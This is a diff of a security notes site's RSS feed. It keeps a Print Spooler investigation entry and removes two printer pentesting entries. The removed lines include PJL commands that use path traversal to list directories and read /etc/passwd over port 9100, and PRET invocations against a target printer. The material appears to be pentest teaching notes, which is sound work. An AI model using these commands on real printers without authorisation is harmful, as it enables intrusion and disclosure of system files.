@@ -15,19 +15,5 @@
       <guid>https://documentnation.github.io/docs/hdks/windows/service/windows-print-spooler-service/</guid>
       <description>Investigation link # Check if the Print Spooler service is running Get-Service -Name Spooler Detection linkServices link Open Services. We can find the Print Spooler on the Right Pane. Double-click on it and see the details. Malicious DLL Location link C:\Windows\System32\spool\drivers\x64\3\ Event Viewer linkOpen Event Viewer, and find event logs in the following directory in the left pane.&#xA;If you want to filter by Event ID, use &amp;ldquo;Filter Current Log&amp;rdquo; in the right pane.</description>
     </item>
-    <item>
-      <title>Raw Printing Pentesting</title>
-      <link>https://documentnation.github.io/docs/hdks/printer/raw-printing-pentesting/</link>
-      <pubDate>Wed, 19 Jul 2023 00:00:00 +0000</pubDate>
-      <guid>https://documentnation.github.io/docs/hdks/printer/raw-printing-pentesting/</guid>
-      <description>Enumeration link nmap --script pjl-ready-message -p 9100 &amp;lt;target-ip&amp;gt; Connect link nc &amp;lt;target-ip&amp;gt; 9100 Commands link # See printer information @PJL INFO STATUS @PJL INFO ID @PJL INFO PRODINFO # See directories in the system @PJL FSDIRLIST NAME=&amp;#34;0:&amp;#34; ENTRY=1 @PJL FSDIRLIST NAME=&amp;#34;0:/../&amp;#34; ENTRY=1 @PJL FSDIRLIST NAME=&amp;#34;0:/../etc/&amp;#34; ENTRY=1 @PJL FSDIRLIST NAME=&amp;#34;0:/../home/&amp;#34; ENTRY=1 # See contents of a file @PJL FSUPLOAD NAME=&amp;#34;0:/../etc/passwd&amp;#34; ENTRY=1 </description>
-    </item>
-    <item>
-      <title>IPP (Internet Printing Protocol) Pentesting</title>
-      <link>https://documentnation.github.io/docs/hdks/printer/ipp-pentesting/</link>
-      <pubDate>Wed, 21 Dec 2022 00:00:00 +0000</pubDate>
-      <guid>https://documentnation.github.io/docs/hdks/printer/ipp-pentesting/</guid>
-      <description>Access in Web Browser linkThe CUPS server can be able to access via browser.&#xA;Try input the following in the URL search form in browser.&#xA;http://&amp;lt;target-ip&amp;gt;:631 Connect linkThe Printer Exploitation Toolkit is a tool for printer secure testing. Assume that we use it.&#xA;Try all three options until the target printer recognized.&#xA;# ps: PostScript python2 pret.py &amp;lt;target-ip&amp;gt;:631 ps # pjl: Printer Job Language python2 pret.py &amp;lt;target-ip&amp;gt;:631 pjl # pcl: Printer Control Language python2 pret.</description>
-    </item>
   </channel>
 </rss>
